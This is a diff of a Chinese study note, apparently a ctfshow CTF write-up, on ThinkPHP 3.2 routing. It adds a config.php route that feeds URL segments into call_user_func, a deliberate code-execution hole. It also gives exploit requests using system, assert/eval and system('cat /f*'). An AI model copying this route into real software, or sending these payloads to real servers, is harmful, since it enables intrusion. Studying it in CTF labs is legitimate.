@@ -1,4 +1,5 @@
 ## **Thinkphp代码基础**
+#### **1、默认路由**
 thinkphp3.2的路由模式：PATHINFO模式
 ```
 http://serverName/index.php/模块/控制器/操作
@@ -15,6 +16,26 @@ REWRITE模式 http://localhost/Home/Index/index/name/123/
 ```
 ![](.topwrite/assets/image_1735972282571.png)
 
+
+^
+#### **2、配置路由**
+存在config.php可以配置路由模式     
+```
+<?php
+return array(
+	//'配置项'=>'配置值'
+    'URL_ROUTER_ON'   => true, 
+	'URL_ROUTE_RULES' => array(
+    'ctfshow/:f/:a' =>function($f,$a){
+    	call_user_func($f, $a);
+    	}
+    )
+);
+这里通过/index.php/ctfshow/函数名/参数  调用利用
+如：
+/index.php/ctfshow/system/pwd
+/index.php/ctfshow/assert/eval($_POST[1])/   同时post： 1=system('cat /f*');
+```
 
 
 
